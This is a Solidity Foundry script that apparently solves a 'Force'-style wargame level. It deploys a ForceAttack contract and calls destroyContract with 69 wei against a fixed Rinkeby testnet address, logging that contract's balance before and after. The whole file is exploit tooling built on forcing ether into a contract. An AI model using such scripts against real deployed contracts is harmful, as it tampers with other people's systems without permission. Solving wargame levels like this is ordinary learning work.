// SDPX-License-Identifier: UNLICENSED

import { Script } from "forge-std/script.sol";
import { console } from "forge-std/console.sol";

import { ForceAttack } from "src/Force/ForceAttack.sol";

contract ForceAttackScript is Script {
    // affected contract: https://rinkeby.etherscan.io/address/0xb56fa7568E4682A8d243F36caB5d52b96b0DAe58#internaltx

    function run() public {
        vm.startBroadcast();
            ForceAttack attacker = new ForceAttack();
            console.logString("Initial Balance:::");
            console.log(address(0xb56fa7568E4682A8d243F36caB5d52b96b0DAe58).balance);
            attacker.destroyContract{value: 69 wei}(payable(address(0xb56fa7568E4682A8d243F36caB5d52b96b0DAe58)));
            console.logString("Post-Destroy Balance:::");
            console.log(address(0xb56fa7568E4682A8d243F36caB5d52b96b0DAe58).balance);
        vm.stopBroadcast();
    }
}